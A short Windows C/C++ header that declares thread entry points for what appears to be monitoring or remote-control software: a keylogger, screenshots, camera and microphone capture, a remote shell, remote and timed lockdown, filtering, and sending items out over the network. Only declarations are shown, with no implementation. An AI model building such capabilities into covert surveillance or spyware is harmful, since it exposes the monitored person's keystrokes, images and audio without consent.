#pragma once
#include <windows.h>
#include "../Control/keylogger.h"
#include "../Control/Recorder.h"
#include "../Control/camera.h"
#include "../DataManagement/Converters.h"
#include "../Network/Request.h"

DWORD WINAPI initFiltering(LPVOID lpParam);
DWORD WINAPI initKeylogger(LPVOID lpParam);
DWORD WINAPI initScreenshot(LPVOID lpParam);
DWORD WINAPI initTimeLockdown(LPVOID lpParam);
DWORD WINAPI initCamera(LPVOID lpParam);
DWORD WINAPI initMic(LPVOID lpParam);
DWORD WINAPI initRemoteLockdown(LPVOID lpParam);
DWORD WINAPI initShell(LPVOID lpParam);
DWORD WINAPI sendItem(LPVOID lpParam, LPSTR itemType);
